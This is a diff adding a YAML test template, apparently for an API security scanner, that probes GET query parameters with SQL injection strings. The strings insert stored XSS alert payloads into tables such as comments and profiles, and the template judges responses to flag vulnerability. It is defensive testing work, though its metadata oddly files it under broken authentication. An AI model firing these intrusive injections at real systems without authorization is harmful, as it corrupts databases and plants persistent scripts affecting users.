@@ -1,0 +1,197 @@
+id: STORED_SQLI_XSS_GET
+info:
+  name: "Stored SQL Injection Test with XSS and GET method APIs"
+  description: >
+    "Stored SQL Injection testing with XSS and GET method APIs involves assessing vulnerabilities where malicious SQL queries are injected into a database and stored for future execution. Attackers exploit these vulnerabilities to inject persistent XSS payloads, which are stored in the database and executed whenever the affected data is retrieved and rendered by the web application. This test identifies and mitigates risks that allow both server-side SQL injection and client-side script execution, compromising data integrity and user security."
+  details: >
+    "Stored SQL Injection testing with XSS and GET method APIs focuses on identifying vulnerabilities where malicious SQL queries and XSS payloads can be injected and stored in a database. These payloads are then executed whenever the stored data is retrieved and displayed by the web application. Attackers use this technique to achieve persistent exploitation, allowing them to execute malicious scripts each time the affected data is accessed. This testing helps uncover security flaws that enable both persistent SQL injection and stored XSS attacks, highlighting the need for proper input validation and output sanitization."
+  impact: >
+    "The impact of Stored SQL Injection combined with XSS and GET method APIs can be severe, allowing attackers to inject malicious SQL queries and XSS payloads into the database. This can lead to persistent exploitation where malicious scripts are executed every time the compromised data is accessed by users. Such attacks can compromise sensitive information, compromise user sessions, and lead to data theft or manipulation. This dual vulnerability poses significant risks to application integrity, user privacy, and overall system security, potentially resulting in financial losses and reputational damage for the organization."
+
+  category:
+    name: NO_AUTH
+    shortName: Broken Authentication
+    displayName: Broken User Authentication (BUA)
+  subCategory: STORED_SQLI_XSS_GET
+  severity: MEDIUM
+  tags:
+    - Business logic
+    - OWASP top 10
+    - HackerOne top 10
+  references:
+    - "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/"
+    - "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa2-broken-authentication.md"
+    - "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html"
+  cwe:
+    - CWE-287
+  cve:
+    - CVE-2020-24008
+    - CVE-2021-45901
+attributes:
+  nature: INTRUSIVE
+  plan: PRO
+  duration: FAST
+
+
+api_selection_filters:
+  method:
+    eq: "GET"
+  response_code:
+    gte: 200
+    lt: 300
+  response_payload:
+    length:
+      gt: 0
+    not_contains:
+      - Error
+      - Internal Server
+      - Failed
+      - Unauthorized
+      - access denied
+      - Forbidden
+      - Method Not allowed
+      - Gateway timeout
+      - request timeout
+      - server error
+      - server busy
+      - authentication error
+      - authorization error
+      - validation error
+      - Permission Denied
+      - invalid token
+      - token expired
+      - session expired
+      - session timeout
+      - unexpected error
+      - unable to process request
+      - bad request
+      - service unavailable
+      - account is locked
+      - account is blocked
+      - multiple failed attempts
+  query_param:
+    for_one:
+      key:
+        regex: ".*"
+        extract: userKey
+      value:
+        extract: userVal
+wordLists:
+  storedXSSPayloads:
+    - "'); INSERT INTO comments (comment) VALUES ('<script>alert(\"XSS\")</script>') --"
+    - "'); INSERT INTO messages (message) VALUES ('<svg/onload=alert(\"XSS\")>') --"
+    - "'); INSERT INTO reviews (review) VALUES ('<img src=\"x\" onerror=\"alert('XSS')\">') --"
+    - "'); INSERT INTO feedback (feedback) VALUES ('<script>alert(\"Stored XSS\")</script>') --"
+    - "'); INSERT INTO posts (content) VALUES ('<svg/onload=alert(\"Stored XSS\")>') --"
+    - "'); INSERT INTO profiles (bio) VALUES ('<img src=\"x\" onerror=\"alert('Stored XSS')\">') --"
+  storedXSSNegativePayloads:
+    - "') where 1=0; INSERT INTO comments (comment) VALUES ('<script>alert(\"XSS\")</script>')--"
+    - "') where 1=0; INSERT INTO messages (message) VALUES ('<svg/onload=alert(\"XSS\")>') --"
+    - "') where 1=0; INSERT INTO reviews (review) VALUES ('<img src=\"x\" onerror=\"alert('XSS')\">') --"
+    - "') where 1=0; INSERT INTO feedback (feedback) VALUES ('<script>alert(\"Stored XSS\")</script>') --"
+    - "') where 1=0; INSERT INTO posts (content) VALUES ('<svg/onload=alert(\"Stored XSS\")>') --"
+    - "') where 1=0; INSERT INTO profiles (bio) VALUES ('<img src=\"x\" onerror=\"alert('Stored XSS')\">') --"
+execute:
+  type: multiple
+  requests:
+    - req:
+        - modify_query_param:
+            userKey: ${userVal}${storedXSSPayloads}
+        - validate:
+            response_code:
+              gte: 200
+              lt: 300
+            response_payload:
+              length:
+                gt: 0
+              contains_either:
+                - "<script>alert(\"XSS\")</script>"
+                - "<svg/onload=alert(\"XSS\")>"
+                - "<img/src=\"x\"/onerror=\"alert('XSS')\">"
+                - "<script>alert(\"Stored XSS\")</script>"
+                - "<svg/onload=alert(\"Stored XSS\")>"
+                - "<img src=\"x\" onerror=\"alert('Stored XSS')\">"
+              not_contains:
+                - Error
+                - Internal Server
+                - Failed
+                - Unauthorized
+                - access denied
+                - Forbidden
+                - Method Not allowed
+                - Gateway timeout
+                - request timeout
+                - server error
+                - server busy
+                - authentication error
+                - authorization error
+                - validation error
+                - Permission Denied
+                - invalid token
+                - token expired
+                - session expired
+                - session timeout
+                - unexpected error
+                - unable to process request
+                - bad request
+                - service unavailable
+                - account is locked
+                - account is blocked
+                - multiple failed attempts
+                - Attention Required!
+                - CloudFlare
+                - Sorry, you have been blocked
+                - " INSERT INTO "
+        - success: x2
+        - failure: exit
+    - req:
+        - modify_query_param:
+            userKey: ${storedXSSNegativePayloads}
+        - validate:
+            response_code:
+              gte: 200
+              lt: 300
+            response_payload:
+              length:
+                gt: 0
+              not_contains:
+                - Error
+                - Internal Server
+                - Failed
+                - Unauthorized
+                - access denied
+                - Forbidden
+                - Method Not allowed
+                - Gateway timeout
+                - request timeout
+                - server error
+                - server busy
+                - authentication error
+                - authorization error
+                - validation error
+                - Permission Denied
+                - invalid token
+                - token expired
+                - session expired
+                - session timeout
+                - unexpected error
+                - unable to process request
+                - bad request
+                - service unavailable
+                - account is locked
+                - account is blocked
+                - multiple failed attempts
+                - Attention Required!
+                - CloudFlare
+                - Sorry, you have been blocked
+                - " INSERT INTO "
+                - "<script>alert(\"XSS\")</script>"
+                - "<svg/onload=alert(\"XSS\")>"
+                - "<img/src=\"x\"/onerror=\"alert('XSS')\">"
+                - "<script>alert(\"Stored XSS\")</script>"
+                - "<svg/onload=alert(\"Stored XSS\")>"
+                - "<img src=\"x\" onerror=\"alert('Stored XSS')\">"
+
+              neq: "${x1.response.body}"
+        - success: vulnerable
+        - failure: exit
